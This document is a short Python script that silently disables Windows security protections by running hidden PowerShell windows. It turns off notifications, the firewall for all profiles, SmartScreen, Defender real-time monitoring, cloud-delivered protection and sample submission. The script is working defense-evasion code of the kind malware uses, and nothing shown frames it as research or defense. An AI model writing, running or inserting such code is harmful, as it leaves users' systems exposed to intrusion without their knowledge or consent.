import os

disable_Notifications = 'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0 -Force'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_Notifications}")

disable_NetworkFirewall = 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_NetworkFirewall}")

disable_SmartScreen = 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Type DWord -Value 0'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_SmartScreen}")

disable_realTimeProtection = 'Set-MpPreference -DisableRealtimeMonitoring $true'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_realTimeProtection}")

disable_CloudDeliveredProtection = 'Set-MpPreference -MAPSReporting Disabled'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_CloudDeliveredProtection}")

disable_AutomaticSampleSubmission = 'Set-MpPreference -SubmitSamplesConsent 2'
os.system(f"PowerShell.exe -WindowStyle hidden {disable_AutomaticSampleSubmission}")

